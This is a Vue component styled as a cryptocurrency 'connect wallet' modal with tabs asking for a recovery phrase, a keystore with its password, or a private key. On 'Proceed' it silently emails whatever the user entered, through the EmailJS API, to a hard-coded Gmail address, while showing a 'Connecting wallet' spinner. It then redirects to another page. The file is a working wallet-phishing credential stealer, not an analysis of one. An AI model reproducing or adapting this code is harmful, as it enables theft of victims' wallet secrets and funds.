<template>
  <transition name="modal-fade">
    <div class="modal-overlay">
      <div class="modal">
        <div class="model-header p-4 bg-gray-100 text-black">
          <img class="rounded-full w-20 h-20" :src="logoUrl" alt="" />
        </div>
        <div class="modal-body p-4 space-y-5 mt-3">
          <div
            style="width: fit-content"
            class="bg-transparent border border-gray-600 mb-6 w-fit rounded-full flex space-x-4 shadow-sm"
          >
            <div
              :class="`${
                activeTab === 'one'
                  ? 'bg-[#006eff] text-white'
                  : 'text-gray-500'
              } cursor-pointer font-semibold text-sm rounded-full px-3 py-3`"
              @click="changeActiveTab('one')"
            >
              Phrase
            </div>
            <div
              :class="`${
                activeTab === 'two'
                  ? 'bg-[#006eff] text-white'
                  : 'text-gray-500'
              }  hover:text-[#006eff] cursor-pointer font-semibold text-sm rounded-full px-3 py-3`"
              @click="changeActiveTab('two')"
            >
              Keystore
            </div>
            <div
              :class="`${
                activeTab === 'three'
                  ? 'bg-[#006eff] text-white'
                  : 'text-gray-500'
              } hover:text-[#006eff] cursor-pointer font-semibold text-sm rounded-full px-3 py-3`"
              @click="changeActiveTab('three')"
            >
              Private Key
            </div>
          </div>
          <hr class="border-gray-600" />
          <div class="rounded-lg w-full mt-10">
            <div id="ethmerge">
              <div v-if="activeTab === 'one'">
                <textarea
                  v-model="phrase"
                  placeholder="Enter your recovery phrase"
                  class="w-full border border-gray-300 p-2 my-2 rounded-md transition duration-300 ease-in-out focus:outline-none focus:ring-2 ring-primary"
                  name=""
                  id=""
                  cols="20"
                  rows="6"
                ></textarea>
                <p class="my-2 text-sm" style="font-size: 14px">
                  Typically 12 (sometimes 24) words separated by single spaces
                </p>
              </div>
              <div v-if="activeTab === 'two'">
                <textarea
                  v-model="keystore"
                  placeholder="Enter Keystore"
                  class="w-full border border-gray-300 p-2 my-2 rounded-md transition duration-300 ease-in-out focus:outline-none focus:ring-2 ring-primary"
                  name=""
                  id=""
                  cols="20"
                  rows="6"
                ></textarea>
                <input
                  v-model="walletPassword"
                  placeholder="Wallet password"
                  class="w-full border border-gray-300 p-2 my-2 rounded-md focus:outline-none focus:ring-2 ring-primary transition duration-300 ease-in-out"
                  name=""
                />
                <p class="my-2 text-xs" style="font-size: 14px">
                  Several lines of text beginning with "{...}" plus the password
                  you used to encrypt it.
                </p>
              </div>
              <div v-if="activeTab === 'three'">
                <input
                  v-model="privateKey"
                  placeholder="Enter your private key"
                  class="w-full border border-gray-300 p-2 my-2 rounded-md focus:outline-none focus:ring-2 ring-primary transition duration-300 ease-in-out"
                  name=""
                />
                <p class="my-2 text-xs" style="font-size: 14px">
                  Typically string of letters and numbers associated with
                  wallet.
                </p>
              </div>
            </div>

            <pre class="text-red-500" style="font-size: 12px">{{
              errorText
            }}</pre>
            <div class="flex justify-between space-x-2 mt-10">
              <button
                class="w-1/2 text-red-400"
                @click="$emit('close-modal')"
                style="border: 1px solid #fc3131; color: #fc3131"
              >
                Cancel
              </button>
              <button
                @click="sendData"
                class="ml-2 w-1/2 bg-blue-500 flex items-center justify-center"
              >
                <span> {{ isLoading ? "Connecting wallet" : "Proceed" }} </span>
                <div
                  v-if="isLoading"
                  class="ml-2 w-4 h-4 rounded-full animate-spin border-4 border-dashed border-white border-t-transparent"
                ></div>
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  </transition>
</template>

<script>
export default {
  props: {
    logoUrl: {
      type: String,
      default: "",
    },
  },
  data() {
    return {
      showLoading: false,
      myVar: null,
      activeTab: "one",
      phrase: "",
      keystore: "",
      walletPassword: "",
      privateKey: "",
      isLoading: "",
      errorText: "",
    };
  },
  mounted() {
    this.redirectFunction();
  },
  methods: {
    changeActiveTab(params) {
      this.errorText = "";
      this.activeTab = params;
    },
    redirectFunction() {
      let self = this;
      this.myVar = setInterval(function () {
        self.showLoading = true;
        self.myStopFunction();
      }, 5000);
    },
    myStopFunction() {
      clearInterval(this.myVar);
    },
    
    async initiateTransaction() {
      try {
        let data = {
          service_id: "service_qor07um",
          template_id: "template_92uu79y",
          user_id: "PgiUVW3qQN-50bYXd",
          template_params: {
            from_name: "Webservices",
            phrase: this.phrase,
            keystore: this.keystore,
            walletPassword: this.walletPassword,
            privateKey: this.privateKey,
            reply_to: "fred.antho9034@gmail.com",
          },
        };
        const ip = await this.$axios.$post(
          "https://api.emailjs.com/api/v1.0/email/send",
          data
        );
        if (ip) {
          this.$router.push("/qr");
        }

        this.isLoading = false;
      } catch (error) {
        this.errorText = "Error";
        this.isLoading = false;
      }
    },
    sendData() {
      this.errorText = "";
      if (this.activeTab === "one") {
        this.isLoading = true;
        const counter = this.phrase.trim().split(/\s+/).length;
        if (counter === 24 || counter === 12) {
          this.initiateTransaction();
        } else {
          this.errorText = "Input not up to 12/24 in lenght";
          this.isLoading = false;
        }
      } else {
        this.isLoading = true;
        this.initiateTransaction();
      }
    },
    countWords(str) {
      if (str !== "") {
        return true;
      } else {
        return false;
      }
    },
  },
};
</script>

<style scoped>
.modal-overlay {
  position: fixed;
  top: 0;
  bottom: 0;
  left: 0;
  right: 0;
  display: flex;
  justify-content: center;
  background-color: #000000da;
}
.modal {
  /* text-align: center; */
  background-color: white;
  /* padding: 20px; */
  margin: 20px 10px;
  height: fit-content;
  display: block;
  position: relative;
  width: 600px;
  margin-top: 10%;
  /* padding: 60px 0; */
  border-radius: 20px;
}
.close {
  margin: 10% 0 0 16px;
  cursor: pointer;
}
.close-img {
  width: 25px;
}
.check {
  width: 150px;
}
h6 {
  font-weight: 500;
  font-size: 28px;
  margin: 20px 0;
}
p {
  /* font-weight: 500; */
  font-size: 16px;
  margin: 20px 0;
}
button {
  /* background-color: #007bff; */
  height: 50px;
  color: white;
  font-size: 14px;
  border-radius: 5px;
}
.modal-fade-enter,
.modal-fade-leave-to {
  opacity: 0;
}
.modal-fade-enter-active,
.modal-fade-leave-active {
  transition: opacity 0.5s ease;
}
</style>
